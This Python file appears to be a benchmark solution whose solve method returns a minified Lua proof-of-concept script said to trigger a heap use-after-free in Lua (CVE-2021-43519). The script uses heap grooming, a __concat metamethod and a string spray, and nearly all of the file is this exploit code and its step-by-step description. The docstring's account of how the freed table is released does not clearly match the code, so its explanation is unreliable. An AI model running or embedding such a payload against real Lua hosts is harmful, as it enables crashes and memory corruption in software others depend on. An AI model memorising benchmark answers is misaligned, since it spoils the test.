import base64

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) that triggers CVE-2021-43519.

        The vulnerability is a Heap Use After Free in Lua due to incorrect
        compiler optimizations for a <const> _ENV upvalue. The compiler
        erroneously assumes the upvalue will not be modified, but a call
        to a metamethod can change it.

        This PoC works as follows:
        1.  **Heap Grooming**: Prepares the heap by allocating and deallocating
            blocks of strings and tables to create a predictable memory layout.
        2.  **Victim Object**: Creates a local Lua table (`victim_tbl`) that
            will be the target of the use-after-free.
        3.  **Metamethod Trigger**: Sets a `__concat` metamethod on the global
            function metatable. This metamethod is the core of the exploit.
        4.  **Freeing the Victim**: Inside `__concat`, the `_ENV` upvalue, which
            is the sole reference to `victim_tbl`, is reassigned. This makes
            `victim_tbl` eligible for garbage collection.
        5.  **Memory Reclamation**: Immediately after freeing, the metamethod
            allocates numerous strings (`spray`) and forces a garbage collection
            cycle. This is designed to have one of the new strings reuse the
            memory previously occupied by `victim_tbl`.
        6.  **The Crash**: The PoC defines a `crasher` function that captures
            `victim_tbl` as its `<const> _ENV`. When called, it first triggers
            the `__concat` metamethod. Upon return, the compiled code attempts
            to perform a table write (a "global" variable assignment) using a
            stale pointer to the original memory location of `victim_tbl`.
            Since this memory now holds a string, the attempt to access it as a
            table causes a type confusion, leading to a crash.
        """

        # Minified Lua code for the PoC to optimize for size.
        poc_lua_code = (
            b"function g()local a={}for i=1,200 do a[i]=string.rep(string.char(i),50)end;"
            b"for i=1,200,3 do a[i]=nil end;collectgarbage();local b={}for i=1,200 do "
            b"b[i]={}for j=1,10 do b[i][j]=i*j end end;for i=1,200,3 do b[i]=nil end;"
            b"collectgarbage()end;g();g();g();function getfn()local victim={p1=1,p2=2,p3=3,"
            b"p4=4,p5=5,p6=6};local mt={__concat=function(a,b)_ENV={v=1};local s={}for i=1,"
            b"250 do s[i]=string.rep('UAF',20)end;collectgarbage('collect')return''end};"
            b"if debug and debug.setmetatable then debug.setmetatable(function()end,mt)end;"
            b"function crasher()local _ENV<const>=victim;local x=(function()end ..'');"
            b"this_write_accesses_freed_memory=x end;return crasher end;local trigger=getfn();"
            b"collectgarbage('collect');trigger()"
        )
        
        return poc_lua_code